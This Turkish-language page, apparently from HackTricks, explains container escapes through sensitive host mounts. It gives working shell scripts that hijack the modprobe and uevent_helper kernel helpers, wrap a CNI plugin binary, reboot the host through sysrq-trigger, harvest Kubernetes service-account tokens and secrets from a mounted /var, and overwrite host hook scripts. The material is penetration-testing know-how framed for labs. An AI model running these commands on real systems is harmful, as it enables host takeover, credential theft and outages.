# Hassas Host Mount'ları

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Host mount'ları, dikkatle yalıtılmış bir süreç görünümünü doğrudan host kaynaklarına görünürlüğe geri döndürdükleri için pratik container-escape saldırı yüzeylerinin en önemlilerindendir. Tehlikeli durumlar yalnızca `/` ile sınırlı değildir. `/proc`, `/sys`, `/var`, runtime socket'leri, kubelet tarafından yönetilen durum dizinleri veya aygıtlarla ilgili yolların bind mount edilmesi; kernel kontrollerini, kimlik bilgilerini, komşu container dosya sistemlerini ve runtime yönetim arayüzlerini açığa çıkarabilir.

Bu sayfa, kötüye kullanım modelinin farklı alanları kapsaması nedeniyle ayrı koruma sayfalarından bağımsız olarak hazırlanmıştır. Yazılabilir bir host mount'ı kısmen mount namespace'leri, kısmen user namespace'leri, kısmen AppArmor veya SELinux kapsamı, kısmen de tam olarak hangi host yolunun açığa çıkarıldığı nedeniyle tehlikelidir. Konuyu ayrı ele almak, saldırı yüzeyini değerlendirmeyi çok daha kolaylaştırır.

Ayrıca host'taki yazılabilir bir dizini, her container içindeki karşılık gelen yolla karşılaştırın. Dizin, çalıştırılabilir başlangıç betiklerinin bulunduğu bir dizinin üzerine mount edilmişse, daha düşük ayrıcalıklı bir host kullanıcısı, yüksek ayrıcalıklı bir container entrypoint'inin bir sonraki yeniden başlatmada yükleyeceği kodu yerleştirebilir. Tam bind kaynağını ve hedefini, dizinin yazma/arama izinlerini, entrypoint döngüsünü ve çalıştırılabilir dosya gereksinimini, runtime UID'sini ve gerçek bir yeniden başlatma tetikleyicisini doğrulayın. Container UID 0, otomatik olarak host UID 0 anlamına gelmez; host üzerindeki etkiyi user-namespace eşlemesi ve mount politikası belirler. Pasif incelemede, betik yazmadan veya workload'u yeniden başlatmadan yolları ve izinleri raporlayın.

Bir Linux container, ayrı bir Windows host dosya sisteminin bir bölümünü paylaşan bir yönetim VM'sinin içinde çalışıyor olabilir. [VirtualBox paylaşılan klasörleri](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html), host dosyalarının guest içinde görünür olmasının bir yoludur; ancak bu VM'deki root, Windows yöneticisinden hâlâ ayrı bir kimliktir. Paylaşım, okunabilir bir kullanıcının SSH private key'ini açığa çıkarıyorsa bunu bir kimlik bilgisi ipucu olarak değerlendirin: host destekli mount'ın tam yolunu, key'in sahipliğini ve erişimini, eşleşen hesabı ve Windows SSH server'ın **etkin** authorized-key politikasını doğrulamadan bunun host'ta oturum açmaya izin verdiği sonucuna varmayın. Modern [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement), yönetici hesapları için genellikle ayrı bir `administrators_authorized_keys` dosyası kullanır. Rutin envanter çıktılarında private key içeriklerine yer vermeyin; pasif ön değerlendirme için mount ve key yolu üst verileri yeterlidir.

## `/proc`'un Açığa Çıkması

procfs hem sıradan süreç bilgilerini hem de etkisi yüksek kernel kontrol arayüzlerini içerir. Bu nedenle `-v /proc:/host/proc` gibi bir bind mount veya beklenmedik yazılabilir proc girdilerini açığa çıkaran bir container görünümü; bilgi ifşasına, hizmet reddine ya da doğrudan host'ta kod çalıştırılmasına yol açabilir.

procfs içindeki yüksek değerli yollar şunlardır:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/` (özellikle `register` ve `status`)
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Kötüye Kullanım

Önce, yüksek değerli procfs girdilerinden hangilerinin görünür veya yazılabilir olduğunu kontrol edin:

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

Bu yollar farklı nedenlerle ilgi çekicidir. Yazılabilir olduklarında `core_pattern`, `modprobe` ve `binfmt_misc`, host üzerinde code execution yollarına dönüşebilir. `kallsyms`, `kmsg`, `kcore` ve `config.gz`, kernel exploitation için güçlü keşif kaynaklarıdır. `sched_debug` ve `mountinfo`, container içinden host düzenini yeniden oluşturmaya yardımcı olabilecek süreç, cgroup ve dosya sistemi bağlamını açığa çıkarır.

Her yolun pratik değeri farklıdır; hepsini aynı etkiye sahipmiş gibi değerlendirmek triage işlemini zorlaştırır:

- `/proc/sys/kernel/core_pattern`
  Yazılabilir durumdaysa bu, en yüksek etkili procfs yollarından biridir; çünkü kernel bir crash sonrasında pipe handler çalıştırır. `core_pattern` yolunu overlay'de veya mount edilmiş bir host yolunda bulunan bir payload'a yönlendirebilen bir container, çoğu zaman host üzerinde code execution elde edebilir. Özel bir örnek için [read-only-paths.md](protections/read-only-paths.md) dosyasına da bakın.
- `/proc/sys/kernel/modprobe`
  Bu yol, kernel'in modül yükleme mantığını çalıştırması gerektiğinde kullandığı userspace helper'ı kontrol eder. Container içinden yazılabiliyorsa ve host bağlamında yorumlanıyorsa başka bir host code-execution primitive'ine dönüşebilir. Helper yolunu tetiklemenin bir yöntemiyle birlikte kullanıldığında özellikle ilgi çekicidir.
- `/proc/sys/vm/panic_on_oom`
  Bu genellikle temiz bir escape primitive'i değildir; ancak OOM koşullarını kernel panic davranışına dönüştürerek host genelinde hizmet engellemeye yol açabilir.
- `/proc/sys/fs/binfmt_misc`
  Kayıt arayüzü yazılabilir durumdaysa saldırgan, seçtiği bir magic value için handler kaydedebilir ve eşleşen bir dosya çalıştırıldığında host bağlamında execution elde edebilir.
- `/proc/config.gz`
  Kernel exploit triage için kullanışlıdır. Host paket metaverisine ihtiyaç duymadan hangi alt sistemlerin, mitigasyonların ve isteğe bağlı kernel özelliklerinin etkin olduğunu belirlemeye yardımcı olur.
- `/proc/sysrq-trigger`
  Çoğunlukla bir hizmet engelleme yoludur, ancak çok ciddi bir yoldur. Host'u hemen yeniden başlatabilir, panic'e sokabilir veya başka şekilde kesintiye uğratabilir.
- `/proc/kmsg`
  Kernel ring buffer mesajlarını açığa çıkarır. Host fingerprinting ve crash analizi için, ayrıca bazı ortamlarda kernel exploitation'a yardımcı olacak bilgileri sızdırmak için kullanışlıdır.
- `/proc/kallsyms`
  Okunabilir olduğunda değerlidir; dışa aktarılan kernel symbol bilgilerini açığa çıkarır ve kernel exploit geliştirme sırasında adres randomization varsayımlarını aşmaya yardımcı olabilir.
- `/proc/[pid]/mem`
  Bu, süreç belleğine doğrudan erişim arayüzüdür. Hedef sürece gerekli ptrace tarzı koşullarla erişilebiliyorsa başka bir sürecin belleğini okumaya veya değiştirmeye olanak tanıyabilir. Gerçekçi etkisi büyük ölçüde kimlik bilgilerine, `hidepid`, Yama ve ptrace kısıtlamalarına bağlıdır; dolayısıyla güçlü ama koşula bağlı bir yoldur.
- `/proc/kcore`
  Sistem belleğinin core image benzeri bir görünümünü sunar. Dosya çok büyüktür ve kullanımı zahmetlidir; ancak anlamlı ölçüde okunabiliyorsa host'un bellek yüzeyinin ciddi biçimde açığa çıktığını gösterir.
- `/dev/kmem` ve `/dev/mem`
  Bunlar tarihsel olarak yüksek etkili ham bellek **aygıtı** arayüzleridir, procfs dosyaları değildir. Birçok modern sistemde bulunmazlar veya sıkı biçimde kısıtlanırlar; ancak host üzerinde mount edilmiş bir kopyayı açabilen bir container, bu açığa çıkmayı kritik kabul etmelidir. Var olmayan `/proc/kmem` veya `/proc/mem` yollarını aramak yerine bunları diğer hassas `/dev` mount'larıyla birlikte inceleyin.
- `/proc/sched_debug`
  Diğer süreç görünümleri beklenenden daha temiz görünse bile host süreç kimliklerini açığa çıkarabilecek scheduling ve task bilgilerini sızdırır.
- `/proc/[pid]/mountinfo`
  Container'ın host üzerinde gerçekte nerede bulunduğunu, hangi yolların overlay destekli olduğunu ve yazılabilir bir mount'un host içeriğine mi yoksa yalnızca container katmanına mı karşılık geldiğini belirlemek için son derece kullanışlıdır.

`/proc/[pid]/mountinfo` veya overlay ayrıntıları okunabiliyorsa container dosya sisteminin host üzerindeki yolunu bulmak için bunları kullanın:

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

Bu komutlar kullanışlıdır; çünkü host üzerinde kod çalıştırma yöntemlerinin birçoğu, container içindeki bir path'in host açısından karşılık gelen path'e dönüştürülmesini gerektirir.

### Örnek: `modprobe` Yardımcı Path'ini Hazırlama

`/proc/sys/kernel/modprobe` container içinden yazılabiliyorsa ve yardımcı path host bağlamında yorumlanıyorsa, bu path saldırganın kontrol ettiği bir payload'a yönlendirilebilir. Overlay üst dizininin host üzerinden çözümlenmesi gerekir. Ayrıca container host `/tmp` dizinini de mount etmiyorsa, kanıt çıktısı host üzerinden görülebilen aynı container katmanına yazılmalıdır:

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

Hedefe ve kernel davranışına bağlı olan kesin tetikleyici bilinçli olarak tahmin edilmemiştir. Lab'den ayrılmadan önce özgün değeri geri yükleyin. Önemli nokta, yazılabilir bir helper path'in gelecekteki bir kernel helper çağrısını saldırganın kontrolündeki host-path içeriğine yönlendirebilmesidir. Eksik bir overlay `upperdir`, host'un çözemediği bir path, salt okunur bir sysctl mount'u veya seçilen helper'ı hiç çağırmayan bir kernel bu zinciri bozar.

### Tam Örnek: `kallsyms`, `kmsg` ve `config.gz` ile Kernel Keşfi

Amaç anında kaçış yerine exploitability değerlendirmesiyse:

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

Bu komutlar, yararlı sembol bilgilerinin görünür olup olmadığını, son kernel mesajlarının ilginç bir durumu açığa çıkarıp çıkarmadığını ve hangi kernel özelliklerinin veya azaltımlarının derlenmiş olduğunu anlamaya yardımcı olur. Etkisi genellikle doğrudan kaçış sağlamaz, ancak kernel güvenlik açıklarının değerlendirilmesini önemli ölçüde hızlandırabilir.

### Tam Örnek: SysRq Ana Makineyi Yeniden Başlatma

`/proc/sysrq-trigger` yazılabilir durumdaysa ve ana makine görünümüne ulaşıyorsa:

```bash
echo b > /proc/sysrq-trigger
```

Etkisi, ana makinenin hemen yeniden başlatılmasıdır. Bu, incelikli bir örnek değildir ancak procfs'e erişimin bilgi ifşasından çok daha ciddi sonuçlara yol açabileceğini açıkça gösterir.

## `/sys` Exposure

sysfs, büyük miktarda kernel ve cihaz durum bilgisi sunar. Bazı sysfs yolları çoğunlukla fingerprinting için kullanışlıyken diğerleri yardımcı programların çalıştırılmasını, cihaz davranışını, güvenlik modülü yapılandırmasını veya firmware durumunu etkileyebilir.

Yüksek değerli sysfs yolları şunlardır:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Bu yollar farklı nedenlerle önem taşır. `/sys/class/thermal`, termal yönetim davranışını ve dolayısıyla yeterince kısıtlanmamış ortamlarda ana makinenin kararlılığını etkileyebilir. `/sys/kernel/vmcoreinfo`, düşük seviyeli ana makine fingerprinting'ine yardımcı olan crash dump ve kernel yerleşimi bilgilerini leak edebilir. `/sys/kernel/security`, Linux Security Modules tarafından kullanılan `securityfs` arayüzüdür; bu nedenle buraya beklenmedik erişim, MAC ile ilgili durum bilgilerini açığa çıkarabilir veya değiştirebilir. EFI değişken yolları, firmware destekli önyükleme ayarlarını etkileyebilir; bu da onları sıradan yapılandırma dosyalarından çok daha ciddi hâle getirir. `/sys/kernel/debug` altındaki `debugfs` özellikle tehlikelidir; çünkü geliştiricilere yönelik bir arayüz olarak tasarlanmıştır ve güvenlik açısından beklentileri, üretim ortamlarına yönelik sıkılaştırılmış kernel API'lerinden çok daha düşüktür.

Bu listedeki her sysfs girdisi **kernel'e, yapılandırmaya ve donanıma bağlıdır**. Güncel sanallaştırılmış düğümlerde `uevent_helper`, EFI değişkenleri ve termal cihaz girdileri çoğunlukla hiç bulunmaz. Olmayan bir yolu, başka bir kernel'den alınan bir örneğin burada da geçerli olduğunu varsaymak yerine, gerekli bir önkoşulun bulunmadığı şeklinde kaydedin.

Bu yolları incelemek için kullanışlı komutlar şunlardır:

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

Bu komutları ilginç kılan noktalar:

- `/sys/kernel/security`, AppArmor, SELinux veya başka bir LSM yüzeyinin yalnızca host tarafında görünür kalması gerekirken erişilebilir olup olmadığını ortaya çıkarabilir.
- `/sys/kernel/debug`, bu gruptaki en endişe verici bulgudur. `debugfs` mount edilmişse ve okunabiliyor veya yazılabiliyorsa, kesin risk etkin debug düğümlerine bağlı olan geniş bir kernel yüzeyiyle karşılaşmayı bekleyin.
- EFI değişkenlerinin açığa çıkması daha az yaygındır; ancak sıradan çalışma zamanı dosyaları yerine firmware destekli ayarları etkilediğinden yüksek etkiye sahiptir.
- `/sys/class/thermal`, düzenli bir shell tarzı kaçıştan ziyade host kararlılığı ve donanımla etkileşim açısından önemlidir.
- `/sys/kernel/vmcoreinfo` çoğunlukla host parmak izi çıkarma ve çökme analizi kaynağıdır; düşük seviyeli kernel durumunu anlamak için kullanışlıdır.

### Tam Örnek: `uevent_helper`

`/sys/kernel/uevent_helper` kernel'e ve yapılandırmaya bağlıdır ve güncel sistemlerin çoğunda bulunmaz. Varsa, yazılabiliyorsa ve kullanılabilir bir `uevent` tetikleyicisi mevcutsa kernel, saldırganın kontrolündeki bir yardımcı programı çalıştırabilir. Kanıt çıktısı, hem host hem de container görünümlerinden erişilebilen bir yol kullanmalıdır:

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

Bunun çalışmasının nedeni, helper path'in host'un bakış açısından yorumlanmasıdır. Tetiklendiğinde helper, mevcut container'ın içinde değil, host context'inde çalışır. `/sys/class/mem/null/uevent`, bu dosyayı sunan kernel'lerde kullanılabilecek somut bir trigger'dır; diğer cihazlar da kendi `uevent` dosyalarını sunabilir, ancak gerçek donanımda rastgele bir dosya seçmeyin. Lab'den çıkmadan önce özgün değeri geri yükleyin. Helper dosyası veya kontrollü bir trigger yoksa bu tekniğin kullanılabilir olduğunu bildirmeyin.

## `/var` Dizinine Erişim

Host'un `/var` dizinini bir container'a mount etmek, `/` dizinini mount etmek kadar çarpıcı görünmediği için genellikle hafife alınır. Pratikte bu, runtime socket'lerine, container snapshot dizinlerine, kubelet tarafından yönetilen pod volume'lerine, yansıtılmış service account token'larına ve komşu uygulamaların dosya sistemlerine erişmek için yeterli olabilir. Modern node'larda container'larla ilgili operasyonel açıdan en önemli durum bilgileri genellikle `/var` dizininde bulunur.

### Kubernetes Örneği

`hostPath: /var` kullanan bir pod, çoğu zaman diğer pod'ların yansıtılmış token'larını ve overlay snapshot içeriğini okuyabilir:

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

Bu komutlar, mount'un yalnızca önemsiz uygulama verilerini mi yoksa etkisi yüksek cluster kimlik bilgilerini mi açığa çıkardığını anlamaya yarar. Okunabilir bir service-account token, yerel kod yürütmeyi doğrudan Kubernetes API erişimine dönüştürebilir.

Token mevcutsa, token'ı bulmakla yetinmeyip neleri erişebildiğini doğrulayın:

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

Buradaki etki, yerel node erişiminden çok daha büyük olabilir. Geniş RBAC yetkilerine sahip bir token, mount edilmiş bir `/var` dizinini cluster genelinde ele geçirme aracına dönüştürebilir.

### Docker Ve containerd Örneği

Docker host’larında ilgili veriler genellikle `/var/lib/docker` altında bulunurken, containerd tabanlı Kubernetes node’larında `/var/lib/containerd` altında veya snapshotter’a özgü yollarda bulunabilir:

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

Bağlanan `/var`, başka bir workload'un yazılabilir snapshot içeriğini sunuyorsa saldırgan, mevcut container yapılandırmasına dokunmadan uygulama dosyalarını değiştirebilir, web içeriği yerleştirebilir veya başlangıç script'lerini değiştirebilir.

**Atılabilir bir lab workload'unda**, yazılabilir snapshot içeriği uygulama üzerinde oynama, secret kurtarma veya lateral movement işlemlerini gösterebilir. Önce runtime container ID'yi tam snapshot ile eşleştirin ve ilgisiz ya da production snapshot'ını asla düzenlemeyin:

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

Bu komutlar, mount edilmiş `/var`'ın üç temel etki kategorisini gösterdikleri için kullanışlıdır: uygulamaların kurcalanması, sırların ele geçirilmesi ve komşu workload'lara yatay hareket.

Doğrudan snapshot yazma işlemleri, runtime'ın normal durum yönetimini atlayarak container'ı bozabilir veya kanıtları yok edebilir. Salt okunur keşif, yerel olarak Docker `overlay2` üzerinde tekrarlandı: komşu, geçici bir container'a yazılan bir işaretçi, `/var/lib/docker/overlay2/<id>/diff/` altında göründü. Gerçek snapshot değişikliklerini yalnızca bu test için oluşturulmuş geçici bir container ile sınırlı tutun.

## Kubelet Durumu, Plugin'ler ve CNI Yolları

`/var/lib/kubelet`, `/opt/cni/bin` veya `/etc/cni/net.d` mount'ları genellikle ayrıcalıklı DaemonSet'ler, CNI agent'ları, CSI node plugin'leri, GPU operator'ları ve depolama yardımcıları aracılığıyla açığa çıkar. Bu mount'ları "node altyapısı" olarak görmezden gelmek kolaydır; ancak yeni pod'ların yürütme yolunda doğrudan yer alırlar ve genellikle kubelet kimlik bilgilerini, yansıtılmış sırları, kayıt socket'lerini ve host tarafında çalışan yürütülebilir plugin binary'lerini barındırırlar.

Değeri yüksek hedefler şunlardır:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

İnceleme için kullanışlı komutlar:

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

Bu yollar neden önemlidir:

- `/var/lib/kubelet/pki`, kubelet istemci sertifikalarını ve düğüme özgü diğer kimlik bilgilerini açığa çıkarabilir. Küme tasarımına bağlı olarak bunlar bazen API server'a veya kubelet'e yönelik TLS uç noktalarına erişmek için yeniden kullanılabilir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods`, genellikle aynı düğümdeki diğer pod'lara ait projekte edilmiş service account token'larını ve bağlanmış Secret'ları içerir.
- `/var/lib/kubelet/pod-resources/kubelet.sock` esas olarak bir keşif yüzeyidir, ancak oldukça kullanışlıdır: şu anda hangi pod ve container'ların GPU'lara, hugepage'lere, SR-IOV cihazlarına ve düğüme özgü diğer kıt kaynaklara sahip olduğunu gösterir.<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` ve `/var/lib/kubelet/plugins_registry`, hangi CSI, DRA ve device plugin'lerinin kurulu olduğunu ve kubelet'in hangi socket'lerle iletişim kurmasının beklendiğini gösterir. Bu dizinler yalnızca okunabilir değil de yazılabilir durumdaysa, bulgu çok daha ciddi hâle gelir.<sup>[[1]](#references)</sup>
- `/opt/cni/bin` ve `/etc/cni/net.d`, pod ağı kurulum yolunun doğrudan üzerindedir. Buraya yazma erişimi, çoğu zaman yalnızca yapılandırma bilgilerinin açığa çıkması değil, gecikmeli bir host execution olanağı anlamına gelir.<sup>[[2]](#references)</sup>

### Tam Örnek: Yazılabilir `/opt/cni/bin`

Bir host CNI binary dizini read-write olarak bağlanmışsa, bir plugin'i değiştirmek, kubelet o düğümde bir pod sandbox'ı bir sonraki kez oluşturduğunda host execution elde etmek için yeterli olabilir:<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

Bu, mount edilmiş bir `docker.sock` kadar doğrudan değildir; ancak ele geçirilmiş Kubernetes altyapı pod'larında genellikle daha gerçekçidir. İşaretçi, mount edilmiş plugin'in yanına yazılır; böylece container, host-root veya host-`/tmp` mount'u olmasa bile ona erişebilir. Wrapper, özgün argümanları ve standart girdiyi korur; ardından örnek özgün binary'yi geri yükler. Önemli nokta, değiştirilmiş binary'nin mevcut container tarafından değil, daha sonra host'un network kurulum akışı tarafından çalıştırılmasıdır. Yalnızca gözden çıkarılabilir bir node kullanın; çünkü geçersiz bir wrapper, yeni Pod sandbox'larının network almasını engelleyebilir.

## Runtime Soketleri

Hassas host mount'ları genellikle tam dizinler yerine runtime soketlerini içerir. Bunlar, burada açıkça yeniden vurgulanmayı hak edecek kadar önemlidir:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

Bu soketlerden biri mount edildiğinde izlenecek tam exploitation akışları için [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md) dosyasına bakın.

Hızlı bir ilk etkileşim örüntüsü olarak:

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

Bunlardan biri başarılı olursa, "mounted socket" üzerinden "daha ayrıcalıklı bir sibling container başlatma" yoluna ulaşmak, genellikle herhangi bir kernel breakout yolundan çok daha kısadır.

Aynı daemon erişimi **host üzerinde kalıcılık** da sağlayabilir. Host root dizinini writable bind mount olarak bağlayan bir helper container, `docker cp` aracılığıyla dosya alabilir; ardından `docker exec` kullanarak bağlanan host path altına bir SSH key, service unit veya başka bir kalıcılık dosyası yerleştirebilir. Güvenlik sınırı, daemon'ın host mount oluşturma yetkisidir; `docker cp` yalnızca bir hazırlık adımıdır. Runtime socket açığa çıktıktan sonra hem yeni oluşturulan container'ları hem de host kimlik doğrulama veya başlangıç path'lerine yapılan yazma işlemlerini denetleyin.

## Writable Host Path Görev Ele Geçirme

Writable bir host mount'un tehlikeli olması için `/` dizinini açığa çıkarması gerekmez. Bağlanan path, host tarafındaki zamanlanmış bir görev veya servis tarafından daha sonra tüketilecek script'ler, config dosyaları, hook'lar, plugin'ler ya da dosyalar içeriyorsa container, host'un çalıştıracağı içeriği değiştirebilir.

Genel inceleme akışı:

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

Yazılabilir bir dosya bir host process tarafından kullanılıyorsa, test sırasında payload'ı basit ve gözlemlenebilir tutun:

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

İlginç olan güven sınırıdır: yazma işlemi container içinden yapılır, ancak yürütme daha sonra host service bağlamında gerçekleşir. Bu durum, dar kapsamlı bir hostPath veya bind mount'u gecikmeli host-code-execution primitive'ine dönüştürür.

## Paylaşılan Host Path Üzerindeki Root Sahipli Dosyalar

Root olabilen bir container hesabı, host tarafından da kullanılan yazılabilir bir path'e root sahipliğinde bir dosya bırakabilir. Container UID 0, host UID 0'a eşleniyorsa her iki görünüm de aynı dosyayı ifade eder ve host mount'u SUID yürütmesini destekliyorsa bu path'teki root sahipli bir SUID executable'ı çalıştırabilen bir host kullanıcısı, host privilege boundary'sini aşabilir. Bu dosya sahipliği sorunu için container'ın `--privileged` ile çalıştırılması gerekmez. Ayrı koşullar için [user namespace mappings](protections/namespaces/user-namespace.md) ve [SUID tartışmasına](privileged-containers.md) bakın.

Path'i **her iki taraftan** inceleyin: zararsız bir dosyanın sahipliğini ve kimliğini karşılaştırın, container'ın `uid_map` ve `gid_map` dosyalarını kontrol edin ve host'un mount seçenekleriyle yürütme politikasını inceleyin. `nosuid` olmadan container tarafında `rw` olması yalnızca bir adaydır; host sahipliğini, host mount flag'lerini, bir host kullanıcısının erişimini veya AppArmor/SELinux'un yürütmeyi engelleyip engellemediğini kanıtlamaz. `noexec`, geçerli olduğu görünümde yürütmeyi kısıtlar. `/proc/self/mountinfo` içindeki `shared:` ve `master:` etiketleri mount propagation'ı açıklar; dosya içeriğinin host ile paylaşılıp paylaşılmadığını değil. Bir bind mount'ta bu etiketler bulunmayabilir. Host login sağlayan credential reuse, paylaşılan dosya privilege boundary'sinden ayrı bir adımdır.

Host'un runtime storage'ı, açık bir bind mount olmasa bile benzer bir path oluşturabilir. [CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558), ayrıcalıksız bir host kullanıcısının Docker data alt dizinlerinde gezinmesine ve bir container filesystem'ındaki dosyaları çalıştırmasına olanak tanıyordu; Moby, izinleri 20.10.9 sürümünde düzeltti ve dizinleri düzeltmek için çalışan container'ların yeniden başlatılması gerektiğini belirtti. Tam olarak mount edilmiş `overlay2/<id>/merged` path'lerini ve her üst dizinin arama iznini inceleyin; ardından container UID 0'ın host UID 0'a eşlenip eşlenmediğini, gerçek bir root sahipli SetUID executable'ının mevcut ve erişilebilir olup olmadığını ve host görünümünün SetUID yürütmesine izin verip vermediğini belirleyin. Rootless veya user-namespace-remapped container'lar, `nosuid`, `noexec`, `no_new_privs` ve MAC policy sonucu değiştirebilir. Yalnızca runtime sürümü veya gezinilebilir bir path, inceleme için ipucudur; host-root yürütmesinin kanıtı değildir. Aday bir executable'ı çalıştırmadan mount ve dosya metadata'sını inceleyin.

## Mount İle İlgili CVE'ler

Host mount'ları runtime zafiyetleriyle de kesişir. Yakın zamandaki önemli örnekler:

- `runc` içindeki `CVE-2024-21626`: sızdırılan bir directory file descriptor, çalışma dizinini host filesystem'ı üzerinde konumlandırabiliyordu.
- BuildKit içindeki `CVE-2024-23651`, `CVE-2024-23652` ve `CVE-2024-23653`: kötü amaçlı Dockerfile'lar, frontend'ler ve `RUN --mount` akışları, build sırasında host dosyalarına erişimi, silmeyi veya yükseltilmiş ayrıcalıkları yeniden mümkün kılabiliyordu.
